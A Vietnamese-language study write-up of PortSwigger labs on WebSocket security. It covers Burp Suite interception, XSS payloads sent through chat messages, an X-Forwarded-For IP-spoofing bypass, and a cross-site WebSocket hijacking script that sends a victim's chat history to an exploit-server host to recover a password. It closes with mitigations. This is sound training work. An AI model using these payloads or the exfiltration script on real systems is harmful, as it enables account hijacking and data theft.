---
title: WebSockets

---

# WebSockets
- Là giao thức giúp duy trì kết nối hai chiều liên tục và bất đồng bộ giữa trình duyệt (client) và máy chủ (server), được khởi tạo ban đầu thông qua HTTP
- Được sử dụng rộng rãi để xử lý tương tác của người dùng theo thời gian thực và truyền tải các dữ liệu, bao gồm cả thông tin nhạy cảm
- Kênh giao tiếp WebSocket không tự động an toàn hơn HTTP. Mọi dữ liệu truyền qua WebSockets nếu không được xác thực và sanitize kỹ thì đều có thể bị lợi dụng để khai thác các lỗ hổng web như SQLi, XXE, SSRF ở phía server hoặc XSS, CSRF ở phía client

# Manipulating WebSocket traffic
- Để khai thác lỗ hổng trong WebSockets, ta không chỉ dựa vào giao diện UI của trình duyệt vì dữ liệu được truyền tải ngầm qua kết nối socket. Ta cần một công cụ intercepting proxy như Burp Suite để can thiệp vào giữa quá trình giao tiếp:
    - Sửa đổi các tin nhắn WebSocket 
    - Phát lại và tạo ra các tin nhắn WebSocket mới
    - Thao túng các kết nối WebSocket

## Intercepting and modifying WebSocket messages
- Công cụ: tab Burp Proxy.
- Các bước thực hiện:
    - Mở và sử dụng trình duyệt tích của Burp Suite để truy cập vào ứng dụng mục tiêu
    - Tìm chức năng có sử dụng WebSocket 
    - Bật tính năng đánh chặn bằng cách đảm bảo nút Intercept đang ở trạng thái bật
    - Khi gói tin WebSocket xuất hiện trong tab Intercept, ta có thể xem hoặc chỉnh sửa nội dung của nó, sau đó nhấn nút Forward để tiếp tục gửi gói tin đi

- Ta có thể vào phần Settings => WebSocket interception rules để thiết lập quy tắc chỉ đánh chặn chiều gửi đi (từ client lên server) hoặc chiều nhận về (từ server trả về client)

**Replaying and generating new WebSocket messages**
- Thao tác với các tin nhắn qua giao thức WebSocket. Các tính năng chính bao gồm:
    - Chuyển tiếp: gửi tin nhắn từ Burp Proxy sang Burp Repeater để phân tích sâu hơn
    - Sửa đổi & phát lại: cho phép chỉnh sửa nội dung tin nhắn cũ và gửi lại nhiều lần để kiểm thử
    - Tạo mới: hỗ trợ tạo tin nhắn hoàn toàn mới và tùy chọn gửi đến client hoặc server
    - Quản lý lịch sử: cung cấp bảng history để theo dõi, chỉnh sửa và gửi lại nhanh chóng bất kỳ tin nhắn nào đã đi qua kết nối

**Manipulating WebSocket connections**
- Việc xen vào quá trình thiết lập kết nối ban đầu của WebSocket không chỉ dừng lại ở việc chỉnh sửa các tin nhắn được gửi đi. Việc này cần thiết trong 3 trường hợp chính:
    - Mở rộng bề mặt tấn công: tìm kiếm thêm các lỗ hổng bảo mật mới 
    - Khôi phục kết nối: Tạo lại kết nối mới khi các thao tác tấn công thử nghiệm làm sập kết nối hiện tại
    - Làm mới dữ liệu xác thực: Cập nhật lại các token hoặc thông tin đã hết hạn để duy trì quyền truy cập

- Cách thực hiện trên Burp Repeater:
    - Gửi tin nhắn sang Burp Repeater và chọn biểu tượng bút chì cạnh URL WebSocket để mở cấu hình
    - Trình hướng dẫn sẽ cho phép thực hiện một trong ba hành động: kết nối vào một WebSocket hiện tại, nhân bản một kết nối, hoặc khôi phục kết nối đã ngắt
    - Trước khi kết nối, ta có toàn quyền xem và chỉnh sửa các thông số của yêu cầu handshake
    - Sau khi nhấn connect thành công, ta có thể sử dụng session mới này để tiếp tục quá trình gửi tin nhắn và phân tích

# WebSockets security vulnerabilities
- Server side: dữ liệu đầu vào độc hại được gửi qua WebSocket có thể gây ra các lỗi như SQLi hay XXE nếu máy chủ không kiểm tra và xử lý an toàn
- Một số lỗ hổng không trả về dấu hiệu lỗi trực tiếp (dạng blind), nên bắt buộc phải dùng các kỹ thuật kiểm thử nâng cao như OAST mới có thể phát hiện ra
- Lỗ hổng client side): thông qua WebSockets hacker có thể lợi dụng đường truyền để phát tán dữ liệu độc hại đến những người dùng khác trong cùng hệ thống, dẫn đến các lỗ hổng như XSS

# Manipulating WebSocket messages to exploit vulnerabilities
- Các lỗi liên quan đến dữ liệu đầu vào (như XSS, SQLi) trên WebSocket đều bắt nguồn từ việc xen vào và thay đổi nội dung payload (message) gửi đi
- VD: tài liệu minh họa bằng một ứng dụng chat. Nếu máy chủ nhận tin nhắn định dạng JSON từ một user và gửi thẳng nó đến các user khác để render thành mã HTML mà không qua bước sanitization, hệ thống sẽ bị lỗi
- Hacker có thể thay thế nội dung tin nhắn bình thường bằng một đoạn payload dạng HTML/JS. Khi trình duyệt của victim nhận và hiển thị tin nhắn này thì payload sẽ được kích hoạt

**[LAB 1](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)**
![image](https://hackmd.io/_uploads/BJEBgjEYWe.png)
![image](https://hackmd.io/_uploads/H1fIlsNFbl.png)
- Thử gửi 1 tin nhắn và quan sát ở tab WebSockets
- Thử gửi dấu `<` và quan sát thấy ký tự `<` đã được client HTML-encoded trước khi gửi đi
![image](https://hackmd.io/_uploads/rkxlDlsEFbe.png)
![image](https://hackmd.io/_uploads/H1yOloVFZe.png)

- Bật intercept để chặn các tin nhắn WebSocket, sau đó gửi một tin nhắn trò chuyện khác
- Chỉnh sửa tin nhắn bị chặn để nó chứa payload (đoạn mã khai thác) sau: `{"message":"<img src=1 onerror='alert(\"TungtungSahuar!\")'>"}`
- Rồi forward và thấy một alert đã được kích hoạt trong trình duyệt. Điều này cũng sẽ xảy ra tương tự trong trình duyệt của user khác
![image](https://hackmd.io/_uploads/Bki-QsVtbl.png)

# Manipulating the WebSocket handshake to exploit vulnerabilities
- Fake IP: việc máy chủ quá tin tưởng vào các header như `X-Forwarded-For` từ đó bypass các filter chặn IP hoặc kiểm soát truy cập
- Chiếm session: vì kết nối WebSocket kế thừa phiên làm việc (cookie/token) từ request handshake HTTP ban đầu, hacker có thể khai thác các lỗ hổng quản lý session ở bước HTTP này để ảnh hưởng đến toàn bộ luồng WebSocket phía sau
- Khai thác header tùy chỉnh: tấn công thông qua các HTTP header tự chế mà dev thêm vào trong quá trình thiết lập ứng dụng

**[LAB 2](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)**
- Ở tab WebSockets history và quan sát thấy rằng tin nhắn trò chuyện đã được gửi thông qua một tin nhắn WebSocket
![image](https://hackmd.io/_uploads/HycV4ABFZl.png)

- Gửi tới Repeater
- Gửi payload XSS cơ bản `<img src=1 onerror='alert(1)'>`
- Thấy rằng  đã bị chặn, và kết nối WebSocket đã bị ngắt
![image](https://hackmd.io/_uploads/BJHDNCHFWx.png)
- Vào Reconnect và thấy kết nối bị fail vì địa chỉ IP của đã bị ban
- Thêm header sau vào handshake request để spoof IP address `X-Forwarded-For: 1.2.3.4`
- Ấn Connect để kết nối lại thành công WebSocket
- Gửi một message WebSocket có chứa payload XSS đã được obfuscated: `{"message":"<img src=1 oNeRrOr=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>"}`
![image](https://hackmd.io/_uploads/rkW-4CBFZl.png)
![image](https://hackmd.io/_uploads/rksgSArF-e.png)


# Using cross-site WebSockets to exploit vulnerabilities
- Là một dạng CSRF tồn tại ở bước thiết lập kết nối (handshake) của WebSocket
- Attacker lừa trình duyệt của victim (người đang có phiên đăng nhập hợp lệ) tự động mở một kết nối WebSocket đến máy chủ mục tiêu thông qua một trang web độc hại do attacker kiểm soát
-  Nó cho phép attacker điều khiển từ xa tài khoản của victim để thực hiện các chức năng có đặc quyền, hoặc nghe lén,đánh cắp các dữ liệu nhạy cảm được trả về qua luồng WebSocket đó

**What is cross-site WebSocket hijacking?**
- Vuln này xảy ra do sự yếu trong cơ chế verify. Khi máy chủ web chỉ kiểm tra cookie để xác định người dùng trong bước handshake mà bỏ qua việc sử dụng CSRF token (hoặc các giá trị ngẫu nhiên khác), hệ thống sẽ dễ bị khai thác
- Attacker dựng một trang web độc hại trên domain của mình. Khi victim đang có phiên đăng nhập hợp lệ trên ứng dụng và truy cập vào trang này, payload JS trên trang sẽ tự động tạo một kết nối WebSocket chéo trang về phía máy chủ mục tiêu. Máy chủ nhìn thấy cookie hợp lệ đi kèm nên chấp nhận kết nối
- Lỗi CSRF bình thường chỉ là tấn công một chiều (gửi request đi nhưng không đọc được response). Nhưng với CSWSH do tính chất của giao thức WebSocket attacker thiết lập được một kênh giao tiếp hai chiều. Attacker vừa có thể gửi lệnh thay cho victim vừa có thể đọc được toàn bộ dữ liệu nhạy cảm mà máy chủ trả về

**What is the impact of cross-site WebSocket hijacking?**
- Ghi, thực thi: có thể lợi dụng phiên đăng nhập của nạn nhân để gửi các payload lên máy chủ. Bất cứ thao tác nào mà người dùng hợp lệ có thể làm (VD: đổi mật khẩu, chuyển tiền, gửi tin nhắn)
- Đọc: vì WebSocket là kết nối hai chiều, attacker không chỉ gửi lệnh đi mà còn có thể nhận và đọc toàn bộ dữ liệu phản hồi từ máy chủ trả về cho victim (VD: lịch sử chat riêng tư, dữ liệu tài chính, thông tin cá nhân)

**Performing a cross-site WebSocket hijacking attack**
- Kiểm tra quá trình thiết lập kết nối WebSocket có cơ chế phòng chống giả mạo request CSRF không
- Cần tìm các request handshake mà việc xác thực người dùng hoàn toàn phụ thuộc vào cookie. Nếu request đó thiếu các tham số ngẫu nhiên như CSRF token thì nó dễ bị khai thác 

- VD handshake request WebSocket sau đây có khả năng cao bị dính lỗ hổng CSRF do session token duy nhất được truyền thông qua một cookie:
```java!
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOSEJNuflw4Rd9BDNrVmuwBF9rEijeE2
Upgrade: websocket
```
- Request này mở ra CSRF vì phương thức duy nhất để máy chủ nhận diện người dùng là qua dòng `Cookie: session=....` .Máy chủ không yêu cầu thêm bất kỳ token bảo mật ngẫu nhiên nào khác từ người dùng
- Note: `Sec-WebSocket-Key` header này chứa một chuỗi mã hóa ngẫu nhiên và an toàn, nhưng nó không có tác dụng bảo mật, verify. Nó giúp hệ thống mạng (proxy) xử lý bộ nhớ đệm đúng cách. Attacker khi viết payload có thể tự tạo ra một `Sec-WebSocket-Key` bất kỳ để lừa máy chủ

- 3 kịch bản chính:
    - Ghi: gửi các lệnh để thay đổi trạng thái hệ thống bằng quyền của victim như đổi email, gửi tin nhắn lừa đảo
    - Đọc: chủ động gửi các tin nhắn truy vấn qua WebSocket để ép máy chủ trả về các thông tin sít rịt
    - Nghe lén: không cần gửi gì cả, chỉ việc duy trì kết nối và nghe lén những dữ liệu nhạy cảm mà máy chủ tự động đẩy về cho victim như luồng tin nhắn chat trực tiếp, cập nhật số dư tài khoản

**[LAB 3](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)**
payload:
```javascript!
    var ws = new WebSocket('wss://0adf004204a3d6c0808c314900a800fa.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://exploit-0af9000a0404d6e98075303601510061.exploit-server.net/exploit?message=' + btoa(event.data), {
            method: 'GET'
        });
    };
```
![image](https://hackmd.io/_uploads/Byi8ipBtZg.png)

- Decode base64 đoạn message 
![image](https://hackmd.io/_uploads/ryuuj6SKbe.png)

- Lấy được mật khẩu là `rbn68dmdrtc10fbw4s4d`, đăng nhập với username=carlos để solve lab

# How to secure a WebSocket connection
- Mã hóa đường truyền: luôn sử dụng `wss://` thay vì `ws://` để đảm bảo dữ liệu truyền đi được mã hóa bởi TLS,SSL, ngăn các Man-in-the-Middle
- Không cho phép người dùng tự động thay đổi hoặc truyền tham số vào URL của WebSocket. URL này nên được cấu hình tĩnh trong source
- Bắt buộc phải triển khai cơ chế phòng chống CSRF (ví dụ: yêu cầu CSRF token ngẫu nhiên) ngay tại bước HTTP request ban đầu để ngăn chặn triệt để lỗi CSWSH mà chúng ta đã thực hành.
- Không tin bất kỳ tin nhắn nào chạy qua WebSocket. Mọi dữ liệu đi vào từ client gửi lên và đi ra từ server trả về đều phải được sanitize, validate và encode để chặn SQLi, XSS hay XXE